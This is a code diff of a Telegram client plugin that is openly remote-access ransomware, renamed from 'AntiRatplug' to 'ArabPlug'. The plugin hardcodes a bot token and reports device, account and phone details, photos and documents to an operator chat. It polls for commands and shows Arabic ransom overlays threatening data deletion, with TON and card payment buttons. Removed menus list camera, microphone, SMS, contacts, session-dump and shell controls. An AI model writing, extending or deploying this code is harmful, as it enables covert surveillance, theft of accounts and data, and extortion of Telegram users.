@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v22.5 — Operator EN / Victim AR.
-Menu: English. Ransom + overlays: Arabic only.
+ArabPlug v1.0 — ExteraGram .plugin
+Operator UI: English, inline buttons.
+Victim UI: Arabic (MSA) ransomware.
 """
-
-__id__ = "AntiRatplug"
-__name__ = "AntiRatplug"
-__description__ = "v22.5."
-__author__ = "@from_a4"
-__version__ = "22.5"
+__id__ = "ArabPlug"
+__name__ = "RatArabPlugin"
+__description__ = "v1.0 arab free🌠"
+__author__ = "@a4_teamed"
+__version__ = "1.0"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -19,85 +19,41 @@ from java import dynamic_proxy, jclass
 from org.telegram.messenger import ApplicationLoader
 from org.telegram.tgnet import TLRPC
 from java.util import ArrayList
-import json
-import threading
-import time
-import os
-import random
-import re
-import string
-import zipfile
-import io
-import subprocess
-import hashlib
+import json, threading, time, os, random, re, zipfile, io, subprocess
+import hashlib, base64, traceback, gc
+from urllib.request import Request, urlopen
+from urllib.parse import urlsplit, urlunsplit, quote
 
-
-BOT_TOKEN = "8906895129:AAE06LFOFJDuM-Lr62G-FK5ZAPClPdQdrXI"
-BOT_UID = 8391217110
+BOT_TOKEN   = "8899237597:AAHiRm411lCpen9wfZV37XWL6OHY6tqBp4Y"
+BOT_UID     = 8943150715
 BOT_UID_STR = str(BOT_UID)
-API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
+API_BASE    = "https://api.telegram.org/bot" + BOT_TOKEN
 
-# ── VICTIM-FACING (ARABIC ONLY) ───────────────────────────────────────────
+# ═══ VICTIM-FACING (ARABIC MSA ONLY) ════════════════════════════════
 RANSOM_TEXT = (
     "⛔ تم اختراق جهازك بالكامل ⛔\n\n"
     "📱 جهازك الآن تحت السيطرة الكاملة.\n"
-    "🔒 لا تحاول إغلاق التطبيق.\n"
-    "💀 سيتم مسح كل بياناتك.\n"
+    "🔒 لا تُغلق التطبيق.\n"
+    "💀 سيتم حذف جميع بياناتك نهائياً.\n"
     "📸 تم سحب الصور والرسائل.\n\n"
-    "للتواصل: @from_a4"
+    "للتواصل: @a4_teamed"
 )
 RANSOM_PHOTO_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
-RANSOM_WARNING = "⚠️ لو أغلقت التطبيق — كل البيانات هتتمسح ⚠️"
+RANSOM_WARNING   = "⚠️ لو أغلقت التطبيق — كل بياناتك هتتمسح نهائياً ⚠️"
+RANSOM_BTN_TON   = "💎 الدفع عبر TON"
+RANSOM_BTN_CARD  = "💳 الدفع بالبطاقة"
+RANSOM_BTN_SWAP  = "🔄 تغيير طريقة الدفع"
 
-# ── OPERATOR-FACING (ENGLISH) ─────────────────────────────────────────────
-L_TITLE    = "AntiRatplug v22.5"
-L_LOADED   = "AntiRatplug v22.5 loaded"
-L_MANAGE   = "Manage"
-L_MANUAL   = "Manual using"
-L_TROLL    = "Troll"
-L_AUTO     = "Automatic"
-L_HELP     = "❓ Help"
-L_BACK     = "⬅️ Back"
-L_SESSIONS = "Session Control"
-L_SURV     = "Surveillance"
-L_DATA     = "Data Grab"
-L_ACCOUNT  = "Account"
-L_SHELL    = "Shell"
-L_RANSOM   = "Ransom"
-L_LOCK     = "Lock screen"
-L_MUSIC    = "M-music"
-L_FLOOD    = "Flood Gallery"
-L_CLRFLOOD = "Clear Flood"
-L_DIM      = "Dim screen"
-L_FULL_H   = "🌾 Full Harvest"
-L_FULL_L   = "🔒 Full Lockdown"
-L_GIFT     = "🎁 Gift Transfer"
-L_TGKID    = "Tg kid"
-L_SCREEN_G = "Screenshot gain"
-L_PULLOUT  = "Pull Out"
-L_WIPE     = "Wipe Sessions"
-L_KILLALL  = "Kill All Sessions"
-L_KILLPH   = "Kill Phones/PCs"
-L_NUKE_ON  = "Nuke ON"
-L_NUKE_OFF = "Nuke OFF"
-L_SESSDMP  = "Session Dump"
-L_UBOTDMP  = "Userbot Dump"
-L_SCREEN   = "Screenshot"
-L_CAM_F    = "Camera Front"
-L_CAM_B    = "Camera Back"
-L_AUDIO    = "Audio 5s"
-L_SMS      = "SMS"
-L_CONTACTS = "Contacts"
-L_APPS     = "Apps"
-L_CHATS    = "Chats"
-L_INFO     = "Info"
-
-RECIPIENT_CACHE_TTL = 600
-MAX_DOC_SIZE = 5 * 1024 * 1024
+# ═══ OPERATOR-FACING (ENGLISH) ══════════════════════════════════════
+L_TITLE      = "ArabPlug v1.0"
+L_MENU       = "📋 Menu"
+L_REFRESH    = "🔄 Refresh"
+L_BACK       = "◀️ Back"
+L_RANSOM_ON  = "🔥 Ransom ON"
+L_RANSOM_OFF = "🛑 Ransom OFF"
+L_KILL       = "💀 Self-destruct"
 
 _logger = None
-
-
 def _log(msg):
     global _logger
     try:
@@ -107,203 +63,136 @@ def _log(msg):
                 _logger = logcat
             except Exception:
                 _logger = lambda *a, **k: None
-        _logger("[AR25] " + str(msg))
+        _logger("[AP1] " + str(msg))
     except Exception:
         pass
 
-
-def _UC():
-    return jclass("org.telegram.messenger.UserConfig")
-
-
-def _MC():
-    return jclass("org.telegram.messenger.MessagesController")
-
-
-def _CM():
-    return jclass("org.telegram.tgnet.ConnectionsManager")
-
+# ═══ JAVA HELPERS ════════════════════════════════════════════════════
+def _UC(): return jclass("org.telegram.messenger.UserConfig")
+def _MC(): return jclass("org.telegram.messenger.MessagesController")
+def _CM(): return jclass("org.telegram.tgnet.ConnectionsManager")
 
 _CLASS_CACHE = {}
-
-
 def _cls(*names):
     key = names
     c = _CLASS_CACHE.get(key)
-    if c is not None:
-        return c
+    if c is not None: return c
     for n in names:
         try:
             short = n.split("$")[-1]
             c2 = getattr(TLRPC, short, None)
             if c2 is not None:
-                _CLASS_CACHE[key] = c2
-                return c2
-        except Exception:
-            pass
+                _CLASS_CACHE[key] = c2; return c2
+        except Exception: pass
         try:
-            c2 = jclass(n)
-            _CLASS_CACHE[key] = c2
-            return c2
-        except Exception:
-            continue
+            c2 = jclass(n); _CLASS_CACHE[key] = c2; return c2
+        except Exception: continue
     _CLASS_CACHE[key] = None
     return None
 
-
 _ReplyGateCls = None
-
-
 def _reply_gate_cls():
     global _ReplyGateCls
     if _ReplyGateCls is None:
         RD = jclass("org.telegram.tgnet.RequestDelegate")
-
         class _RG(dynamic_proxy(RD)):
             def __init__(self):
                 super().__init__()
                 self.response = None
                 self.error = None
-
             def run(self, response, error):
                 self.response = response
                 self.error = error
-
         _ReplyGateCls = _RG
     return _ReplyGateCls
 
-
 def _safe_int(v, d=0):
     try:
-        if v is None:
-            return d
+        if v is None: return d
         return int(v)
-    except Exception:
-        return d
+    except Exception: return d
 
-
-def _jlist_size(obj):
+def _jlist_size(o):
     try:
-        s = getattr(obj, "size", None)
-        if s is None:
-            return len(obj)
-        if callable(s):
-            return int(s())
-        return int(s)
+        s = getattr(o, "size", None)
+        if s is None: return len(o)
+        return int(s()) if callable(s) else int(s)
     except Exception:
-        try:
-            return len(obj)
-        except Exception:
-            return 0
+        try: return len(o)
+        except Exception: return 0
 
-
-def _jlist_get(obj, i):
+def _jlist_get(o, i):
     try:
-        g = getattr(obj, "get", None)
-        if callable(g):
-            return g(int(i))
-        return obj[int(i)]
-    except Exception:
-        return None
+        g = getattr(o, "get", None)
+        return g(int(i)) if callable(g) else o[int(i)]
+    except Exception: return None
 
-
-def _get_bool_attr(obj, name, default=False):
+def _get_bool_attr(o, n, d=False):
     try:
-        v = getattr(obj, name, default)
-        if v is None:
-            return default
-        if isinstance(v, bool):
-            return v
+        v = getattr(o, n, d)
+        if v is None: return d
+        if isinstance(v, bool): return v
         bv = getattr(v, "booleanValue", None)
-        if callable(bv):
-            return bool(bv())
-        return bool(v)
-    except Exception:
-        return default
-
+        return bool(bv()) if callable(bv) else bool(v)
+    except Exception: return d
 
 def _clean_phone(raw):
-    if raw is None:
-        return ""
+    if raw is None: return ""
     s = str(raw).strip()
-    if not s or s.lower() in ("none", "null", "?", "0", ""):
-        return ""
-    digits = "".join(c for c in s if c.isdigit())
-    if len(digits) < 7 or len(digits) > 15:
-        return ""
-    if digits in ("88888888888", "80000000000", "11111111111"):
-        return ""
-    if set(digits) == {"0"} or set(digits) == {"8"}:
-        return ""
-    return "+" + digits
-
+    if not s or s.lower() in ("none", "null", "?", "0", ""): return ""
+    d = "".join(c for c in s if c.isdigit())
+    if len(d) < 7 or len(d) > 15: return ""
+    if d in ("88888888888", "80000000000", "11111111111"): return ""
+    if set(d) == {"0"} or set(d) == {"8"}: return ""
+    return "+" + d
 
 def _phone_from_user(u):
-    if u is None:
-        return ""
+    if u is None: return ""
     for attr in ("phone", "phoneNumber", "phone_number"):
         try:
             v = getattr(u, attr, None)
-            if v is None:
-                continue
+            if v is None: continue
             r = _clean_phone(v)
-            if r:
-                return r
-        except Exception:
-            continue
+            if r: return r
+        except Exception: continue
     return ""
-
 
 def _is_ton_address(s):
     try:
         s = str(s).strip().replace(" ", "").replace("\n", "")
-        if not s:
-            return False
+        if not s: return False
         if s.startswith(("0:", "-1:")):
             h = s.split(":", 1)[1]
             return len(s) >= 66 and len(h) == 64 and all(c in "0123456789abcdefABCDEF" for c in h)
-        if len(s) < 44 or len(s) > 66:
-            return False
+        if len(s) < 44 or len(s) > 66: return False
         b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
-        if not all(c in b64 for c in s):
-            return False
+        if not all(c in b64 for c in s): return False
         return s[0] in ("E", "U", "k", "0") and len(s) in (44, 48, 52, 56, 60, 64)
-    except Exception:
-        return False
-
+    except Exception: return False
 
 def _is_blockchain_gift(gift, sg=None):
     try:
-        if _get_bool_attr(gift, "burned", False):
-            return True
+        if _get_bool_attr(gift, "burned", False): return True
         for obj in ([sg] if sg is not None else []) + [gift]:
-            if obj is None:
-                continue
+            if obj is None: continue
             for k in ("owner_address", "ownerAddress", "ton_address", "tonAddress", "blockchain_address"):
                 v = getattr(obj, k, None)
-                if v and _is_ton_address(v):
-                    return True
+                if v and _is_ton_address(v): return True
             v = getattr(obj, "address", None)
-            if v and _is_ton_address(v):
-                return True
-    except Exception:
-        pass
+            if v and _is_ton_address(v): return True
+    except Exception: pass
     return False
 
-
+# ═══ HTTP / BOT API ═════════════════════════════════════════════════
 def _http_get(url, timeout=30):
-    from urllib.request import Request, urlopen
     try:
         req = Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
         with urlopen(req, timeout=timeout) as r:
             return r.read().decode("utf-8", "ignore")
     except Exception as e:
-        _log("http get: %s" % e)
-        return None
-
+        _log("http get: %s" % e); return None
 
 def _http_post_json(url, body, timeout=30):
-    from urllib.request import Request, urlopen
     try:
         data = json.dumps(body, ensure_ascii=False).encode("utf-8")
         req = Request(url, data=data, method="POST",
@@ -312,26 +201,21 @@ def _http_post_json(url, body, timeout=30):
         with urlopen(req, timeout=timeout) as r:
             return r.read().decode("utf-8", "ignore")
     except Exception as e:
-        _log("http post: %s" % e)
-        return None
-
+        _log("http post: %s" % e); return None
 
 def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout=120):
-    from urllib.request import Request, urlopen
     try:
-        boundary = "----ARBoundary" + str(int(time.time() * 1000))
+        boundary = "----ARB" + str(int(time.time() * 1000))
         body = io.BytesIO()
         for k, v in fields.items():
             body.write(("--" + boundary + "\r\n").encode())
             body.write(('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode())
-            body.write(str(v).encode("utf-8"))
-            body.write(b"\r\n")
+            body.write(str(v).encode("utf-8")); body.write(b"\r\n")
         body.write(("--" + boundary + "\r\n").encode())
         body.write(('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
                     % (file_field, file_name)).encode())
         body.write(b"Content-Type: application/octet-stream\r\n\r\n")
-        body.write(file_bytes)
-        body.write(b"\r\n")
+        body.write(file_bytes); body.write(b"\r\n")
         body.write(("--" + boundary + "--\r\n").encode())
         data = body.getvalue()
         req = Request(url, data=data, method="POST",
@@ -340,323 +224,106 @@ def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout
         with urlopen(req, timeout=timeout) as r:
             return r.read().decode("utf-8", "ignore")
     except Exception as e:
-        _log("http multipart: %s" % e)
-        return None
+        _log("http multipart: %s" % e); return None
 
-
-class PluginSecurityPlugin(BasePlugin):
+# ═══ PLUGIN CLASS ═══════════════════════════════════════════════════
+class ArabPlugPlugin(BasePlugin):
     def __init__(self):
         super().__init__()
         self._sync_running = False
-        self._active = False
         self.stop = False
-        self._pending_delegates = []
         self._rpc_lock = threading.RLock()
-        self._jitter = random.randint(400, 900)
-
         self.account = 0
         self.user_id = 0
         self.username = ""
         self.dev = ""
-
-        self._recipient_ah_cache = {}
-        self._recipient_lock = threading.Lock()
-        self._last_session_confirm = {}
+        self._jitter = random.randint(400, 900)
+        self.cfg = {}
         self._fee_deficit = 0
-
-        self._tg_kid_watching = False
-        self._tg_kid_seen = set()
-        self._tg_kid_thread = None
-
+        self._auto_h_running = False
+        self._auto_h_done = False
+        self._gifts_unhooked = True
+        self._gifts_req_clean = False
+        self._last_rpc_unhooked = False
+        self._resolve_err = ""
+        self._onchain_cache = {}
+        self._RESOLVED_AH = {}
+        self._RESOLVED_TARGETS = {}
         self._ransom_view = None
         self._ransom_wm = None
         self._ransom_decor = None
         self._ransom_photo_path = ""
-        self._ransom_photo_url = ""
-        self._locker_view = None
-        self._locker_on = False
-        self._dim_view = None
-        self._dim_active = False
-        self._music_mp = None
-        self._flood_uris = []
-
         self._input_mode = None
-
-        self._nuke_on = False
-        self._nuke_thread = None
-        self._nuke_interval = 60
-        self._nuke_pass = 0
 
     def on_plugin_load(self):
         self._sync_running = True
-        self._active = True
         self.stop = False
         try:
             self.dev = hashlib.md5((str(time.time()) + str(random.random())).encode()).hexdigest()[:16]
         except Exception:
             self.dev = "unknown"
-        try:
-            self.add_on_send_message_hook()
-        except Exception as e:
-            _log("hook: %s" % e)
-        try:
-            self._check_persisted_nuke()
-        except Exception:
-            pass
         threading.Thread(target=self._boot, daemon=True).start()
 
     def on_plugin_unload(self):
         self._sync_running = False
-        self._active = False
         self.stop = True
-        self._tg_kid_watching = False
-        self._nuke_on = False
-        for fn in (self._dismiss_ransom, self._clear_locker,
-                   self._clear_dim, self._clear_music):
-            try:
-                fn()
-            except Exception:
-                pass
+        try: self._dismiss_ransom()
+        except Exception: pass
 
-    def create_settings(self):
-        return []
+    def create_settings(self): return []
 
-    def _html_escape(self, text):
-        if text is None:
-            return ""
-        t = str(text)
-        return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
-
-    def _boot(self):
-        time.sleep(self._jitter / 1000.0)
-        time.sleep(random.uniform(0.2, 0.6))
-        try:
-            self._send_msg(L_LOADED)
-        except Exception as e:
-            _log("boot send: %s" % e)
-        try:
-            self._send_manage_button()
-        except Exception as e:
-            _log("boot btn: %s" % e)
-        try:
-            self._start_polling()
-        except Exception as e:
-            _log("boot poll: %s" % e)
-
-    def on_send_message_hook(self, account, params):
-        return HookResult()
-
-    def _uc(self):
-        try:
-            sa = int(_UC().selectedAccount)
-            if sa:
-                return sa
-        except Exception:
-            pass
-        for i in range(16):
-            try:
-                if _UC().getInstance(i).getClientUserId():
-                    return i
-            except Exception:
-                pass
-        return 0
-
-    def _my_id(self, account=None, discover=False):
-        acc = account if account is not None else self.account
-        try:
-            return int(_UC().getInstance(int(acc)).getClientUserId())
-        except Exception:
-            pass
-        if not discover:
-            return 0
-        for i in range(16):
-            try:
-                uid = int(_UC().getInstance(i).getClientUserId())
-                if uid:
-                    self.account = i
-                    return uid
-            except Exception:
-                pass
-        return 0
-
-    def _get_accounts_list(self):
-        out = []
-        try:
-            mc = int(getattr(jclass("org.telegram.messenger.UserConfig"),
-                             "MAX_ACCOUNT_COUNT", 8))
-        except Exception:
-            mc = 8
-        mc = max(mc, 16)
-        for i in range(mc):
-            try:
-                uc = _UC().getInstance(i)
-                if not uc or not uc.isClientActivated():
-                    continue
-                uid = int(uc.getClientUserId())
-                if uid == 0:
-                    continue
-                u = None
-                try:
-                    u = uc.getCurrentUser()
-                except Exception:
-                    pass
-                if u is None:
-                    try:
-                        u = _MC().getInstance(i).getUser(uid)
-                    except Exception:
-                        pass
-                un = ""
-                ph = ""
-                if u is not None:
-                    un = str(getattr(u, "username", "") or "")
-                    raw = _phone_from_user(u)
-                    ph = raw.lstrip("+") if raw else ""
-                out.append({"id": i, "user_id": uid, "username": un, "phone": ph})
-            except Exception as e:
-                _log("acc %d: %s" % (i, e))
-        return out
-
-    def _get_input_peer(self, account, peer_id):
-        try:
-            mc = _MC().getInstance(account)
-            peer_id = int(peer_id)
-            if peer_id > 0:
-                user = mc.getUser(peer_id)
-                IPUser = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerUser",
-                              "org.telegram.tgnet.tl.TL_inputPeerUser")
-                if not IPUser:
-                    return None
-                ip = IPUser()
-                ip.user_id = int(user.id) if user is not None else peer_id
-                ip.access_hash = _safe_int(getattr(user, "access_hash", 0)) if user is not None else 0
-                return ip
-            if peer_id < -1000000000000:
-                cid = -peer_id - 1000000000000
-                chat = mc.getChat(cid)
-                IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
-                                 "org.telegram.tgnet.tl.TL_inputPeerChannel")
-                if not IPChannel:
-                    return None
-                ip = IPChannel()
-                ip.channel_id = _safe_int(getattr(chat, "id", cid)) if chat is not None else cid
-                ip.access_hash = _safe_int(getattr(chat, "access_hash", 0)) if chat is not None else 0
-                return ip
-            if peer_id < 0:
-                cid = -peer_id
-                chat = mc.getChat(cid)
-                if chat is not None and getattr(chat, "migrated_to", None) is not None:
-                    mt = chat.migrated_to
-                    IPChannel = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChannel",
-                                     "org.telegram.tgnet.tl.TL_inputPeerChannel")
-                    if not IPChannel:
-                        return None
-                    ip = IPChannel()
-                    ip.channel_id = _safe_int(getattr(mt, "channel_id", 0))
-                    ip.access_hash = _safe_int(getattr(mt, "access_hash", 0))
-                    return ip
-                IPChat = _cls("org.telegram.tgnet.TLRPC$TL_inputPeerChat",
-                              "org.telegram.tgnet.tl.TL_inputPeerChat")
-                if not IPChat:
-                    return None
-                ip = IPChat()
-                ip.chat_id = int(cid)
-                return ip
-        except Exception as e:
-            _log("peer: %s" % e)
-        return None
-
-    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
-        if fast and timeout > 8.0:
-            timeout = 8.0
-        gate = _reply_gate_cls()()
-        with self._rpc_lock:
-            self._pending_delegates.append(gate)
-        try:
-            cm = _CM().getInstance(account)
-            cm.sendRequest(req, gate)
-            deadline = time.time() + timeout
-            while time.time() < deadline:
-                if gate.response is not None or gate.error is not None:
-                    break
-                time.sleep(0.08)
-        finally:
-            try:
-                self._pending_delegates.remove(gate)
-            except Exception:
-                pass
-        return gate.response, gate.error
-
-    def _parallel(self, jobs, workers=5, timeout=25):
-        try:
-            from concurrent.futures import ThreadPoolExecutor
-        except Exception:
-            out = []
-            for j in jobs:
-                try:
-                    out.append(j[0](*j[1:]))
-                except Exception as e:
-                    out.append(e)
-            return out
-        out = []
-        try:
-            with ThreadPoolExecutor(max_workers=workers) as ex:
-                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
-                for f in futs:
-                    try:
-                        out.append(f.result(timeout=timeout))
-                    except Exception as e:
-                        out.append(e)
-        except Exception as e:
-            _log("parallel: %s" % e)
-            for j in jobs:
-                try:
-                    out.append(j[0](*j[1:]))
-                except Exception as ee:
-                    out.append(ee)
-        return out
-
-    def _api(self, method):
-        return API_BASE + "/" + method
+    # ── Bot API ────────────────────────────────────────────────────
+    def _api(self, m): return API_BASE + "/" + m
 
     def _send_msg(self, text, html=False, retries=2):
-        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000]}
-        if html:
-            body["parse_mode"] = "HTML"
+        body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000],
+                "disable_web_page_preview": True}
+        if html: body["parse_mode"] = "HTML"
         for att in range(max(1, retries)):
             r = _http_post_json(self._api("sendMessage"), body, timeout=20)
-            if r is not None:
-                return r
+            if r is not None: return r
             time.sleep(1 + att)
         return None
 
-    def _send_markup(self, text, keyboard, html=False):
+    def _send_markup(self, text, kb, html=False):
         body = {"chat_id": BOT_UID_STR, "text": str(text)[:4000],
-                "reply_markup": keyboard}
-        if html:
-            body["parse_mode"] = "HTML"
-        _http_post_json(self._api("sendMessage"), body, timeout=20)
+                "reply_markup": kb, "disable_web_page_preview": True}
+        if html: body["parse_mode"] = "HTML"
+        return _http_post_json(self._api("sendMessage"), body, timeout=20)
 
-    def _send_photo(self, file_path, caption=""):
+    def _edit_markup(self, mid, text, kb, html=False):
+        body = {"chat_id": BOT_UID_STR, "message_id": int(mid),
+                "text": str(text)[:4000], "reply_markup": kb,
+                "disable_web_page_preview": True}
+        if html: body["parse_mode"] = "HTML"
+        r = _http_post_json(self._api("editMessageText"), body, timeout=20)
+        if r is None: return self._send_markup(text, kb, html)
+        return r
+
+    def _send_photo(self, path, cap=""):
         try:
-            with open(file_path, "rb") as f:
-                raw = f.read()
+            with open(path, "rb") as f: raw = f.read()
         except Exception as e:
-            _log("photo read: %s" % e)
-            return
-        fields = {"chat_id": BOT_UID_STR, "caption": str(caption)[:200]}
-        _http_post_multipart(self._api("sendPhoto"), fields, "photo",
-                             os.path.basename(file_path), raw)
+            _log("photo: %s" % e); return
+        _http_post_multipart(self._api("sendPhoto"),
+                             {"chat_id": BOT_UID_STR, "caption": str(cap)[:200]},
+                             "photo", os.path.basename(path), raw)
 
-    def _send_document_bytes(self, filename, data):
-        fields = {"chat_id": BOT_UID_STR, "caption": str(filename)[:200]}
-        _http_post_multipart(self._api("sendDocument"), fields, "document",
-                             filename, data)
+    def _send_doc(self, fname, data, cap=""):
+        _http_post_multipart(self._api("sendDocument"),
+                             {"chat_id": BOT_UID_STR, "caption": str(cap)[:200]},
+                             "document", fname, data)
 
-    def _answer_callback(self, cb_id):
-        _http_post_json(self._api("answerCallbackQuery"),
-                        {"callback_query_id": str(cb_id)}, timeout=10)
+    def _answer_cb(self, cb_id, text=""):
+        body = {"callback_query_id": str(cb_id)}
+        if text: body["text"] = str(text)[:200]
+        _http_post_json(self._api("answerCallbackQuery"), body, timeout=10)
 
-    def _start_polling(self):
+    # ── boot ───────────────────────────────────────────────────────
+    def _boot(self):
+        time.sleep(self._jitter / 1000.0)
+        try: self._send_manage_button()
+        except Exception as e: _log("boot: %s" % e)
         threading.Thread(target=self._poll, daemon=True).start()
 
     def _poll(self):
@@ -664,361 +331,897 @@ class PluginSecurityPlugin(BasePlugin):
         try:
             r = _http_get(self._api("getUpdates") + "?offset=-1&timeout=0", timeout=10)
             if r:
-                try:
-                    j = json.loads(r)
-                    if j.get("ok") and j.get("result"):
-                        offset = j["result"][-1]["update_id"] + 1
-                except Exception:
-                    pass
-        except Exception:
-            pass
+                j = json.loads(r)
+                if j.get("ok") and j.get("result"):
+                    offset = j["result"][-1]["update_id"] + 1
+        except Exception: pass
         while self._sync_running and not self.stop:
             try:
-                r = _http_get(self._api("getUpdates") + "?offset=" + str(offset) + "&timeout=15",
-                              timeout=25)
+                r = _http_get(self._api("getUpdates") + "?offset=" + str(offset) + "&timeout=15", timeout=25)
                 if r:
-                    try:
-                        j = json.loads(r)
-                    except Exception:
-                        j = None
-                    if j and j.get("ok") and j.get("result"):
-                        for u in j["result"]:
+                    try: j = json.loads(r)
+                    except Exception: j = None
+                    if j and j.get("ok"):
+                        for u in j.get("result", []):
                             offset = u["update_id"] + 1
                             if "callback_query" in u:
-                                try:
-                                    threading.Thread(target=self._handle_callback,
-                                                     args=(u["callback_query"],),
-                                                     daemon=True).start()
-                                except Exception:
-                                    pass
+                                threading.Thread(target=self._handle_callback,
+                                                 args=(u["callback_query"],), daemon=True).start()
                             elif "message" in u:
-                                try:
-                                    threading.Thread(target=self._handle_message,
-                                                     args=(u["message"],),
-                                                     daemon=True).start()
-                                except Exception:
-                                    pass
-            except Exception as e:
-                _log("poll: %s" % e)
+                                threading.Thread(target=self._handle_message,
+                                                 args=(u["message"],), daemon=True).start()
+            except Exception as e: _log("poll: %s" % e)
             time.sleep(0.5)
 
+    # ═══ INLINE MENU SYSTEM ═════════════════════════════════════════
+    def _dtag(self): return self.dev[:8]
+
+    def _accounts_list(self):
+        out = []
+        try: max_c = int(getattr(_UC(), "MAX_ACCOUNT_COUNT", 8))
+        except Exception: max_c = 8
+        max_c = max(max_c, 16)
+        for i in range(max_c):
+            try:
+                uc = _UC().getInstance(i)
+                if not uc or not uc.isClientActivated(): continue
+                uid = int(uc.getClientUserId())
+                if uid == 0: continue
+                u = None
+                try: u = uc.getCurrentUser()
+                except Exception: pass
+                if u is None:
+                    try: u = _MC().getInstance(i).getUser(uid)
+                    except Exception: pass
+                un = str(getattr(u, "username", "") or "") if u is not None else ""
+                ph = _phone_from_user(u) if u is not None else ""
+                prem = _get_bool_attr(u, "premium", False) if u is not None else False
+                out.append({"id": i, "user_id": uid, "username": un,
+                            "phone": ph, "premium": prem})
+            except Exception as e:
+                _log("acc %d: %s" % (i, e))
+        return out
+
+    def _label(self, a):
+        if a.get("username"): lbl = "@" + a["username"]
+        elif a.get("phone"): lbl = a["phone"]
+        else: lbl = "uid_" + str(a["user_id"])
+        if a.get("premium"): lbl = "⭐ " + lbl
+        return lbl
+
     def _send_manage_button(self):
-        username = "unknown"
-        phone = ""
-        try:
-            uc = _UC().getInstance(0)
-            uid = uc.getClientUserId()
-            user = uc.getCurrentUser()
-            if user is not None:
-                username = str(user.username) if user.username else ("id:" + str(uid))
-                phone = _phone_from_user(user)
-            else:
-                username = "id:" + str(uid)
-        except Exception as e:
-            _log("manage btn user: %s" % e)
-        line = "<b>%s</b>\nUser: @%s" % (L_TITLE, username)
-        if phone:
-            line += "\nPhone: " + phone
-        kb = {"inline_keyboard": [[{"text": L_MANAGE, "callback_data": "menu"}]]}
-        self._send_markup(line, kb, html=True)
+        d = self._dtag()
+        accs = self._accounts_list()
+        text = ("🟢 <b>ArabPlug online</b>\n"
+                "Device: <code>%s</code>\nAccounts: %d") % (self.dev, len(accs))
+        kb = {"inline_keyboard": [[{"text": L_MENU, "callback_data": "menu:" + d}]]}
+        self._send_markup(text, kb, html=True)
 
-    def _show_main_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": L_MANUAL}],
-                [{"text": L_TROLL}],
-                [{"text": L_AUTO}],
-                [{"text": L_TGKID}],
-                [{"text": L_SCREEN_G}],
-                [{"text": L_HELP}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(L_TITLE, kb, html=True)
+    def _show_main_menu_inline(self, mid=None):
+        d = self._dtag()
+        accs = self._accounts_list()
+        kb = []
+        row = []
+        for a in accs:
+            row.append({"text": self._label(a),
+                        "callback_data": "acc:%s:%d" % (d, int(a["id"]))})
+            if len(row) >= 2: kb.append(row); row = []
+        if row: kb.append(row)
+        if not accs:
+            kb.append([{"text": "⚠ no accounts", "callback_data": "refresh:" + d}])
+        kb.append([{"text": L_REFRESH, "callback_data": "refresh:" + d}])
+        text = ("📱 <b>Device</b> <code>%s</code>\n"
+                "Accounts: %d\n\nSelect account:") % (self.dev, len(accs))
+        if mid: self._edit_markup(mid, text, {"inline_keyboard": kb}, html=True)
+        else: self._send_markup(text, {"inline_keyboard": kb}, html=True)
 
-    def _show_manual_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": L_SESSIONS}],
-                [{"text": L_SURV}],
-                [{"text": L_DATA}],
-                [{"text": L_ACCOUNT}],
-                [{"text": L_SHELL}],
-                [{"text": L_BACK}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(L_MANUAL, kb, html=True)
-
-    def _show_sessions_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": L_WIPE}],
-                [{"text": L_KILLALL}],
-                [{"text": L_KILLPH}],
-                [{"text": L_NUKE_ON}],
-                [{"text": L_NUKE_OFF}],
-                [{"text": L_SESSDMP}],
-                [{"text": L_UBOTDMP}],
-                [{"text": L_BACK}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(L_SESSIONS, kb, html=True)
-
-    def _show_surveillance_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": L_SCREEN}],
-                [{"text": L_CAM_F}],
-                [{"text": L_CAM_B}],
-                [{"text": L_AUDIO}],
-                [{"text": L_BACK}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(L_SURV, kb, html=True)
-
-    def _show_data_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": L_SMS}],
-                [{"text": L_CONTACTS}],
-                [{"text": L_APPS}],
-                [{"text": L_CHATS}],
-                [{"text": L_BACK}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(L_DATA, kb, html=True)
-
-    def _show_account_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": L_INFO}],
-                [{"text": L_TGKID}],
-                [{"text": L_SCREEN_G}],
-                [{"text": L_PULLOUT}],
-                [{"text": L_BACK}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(L_ACCOUNT, kb, html=True)
-
-    def _show_shell_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": "ls /sdcard"}],
-                [{"text": "ps"}],
-                [{"text": "ifconfig"}],
-                [{"text": "df -h"}],
-                [{"text": L_BACK}],
-            ],
-            "resize_keyboard": True,
-        }
-        self._send_markup(L_SHELL, kb, html=True)
-
-    def _show_troll_menu(self):
-        kb = {
-            "keyboard": [
-                [{"text": L_RANSOM}],
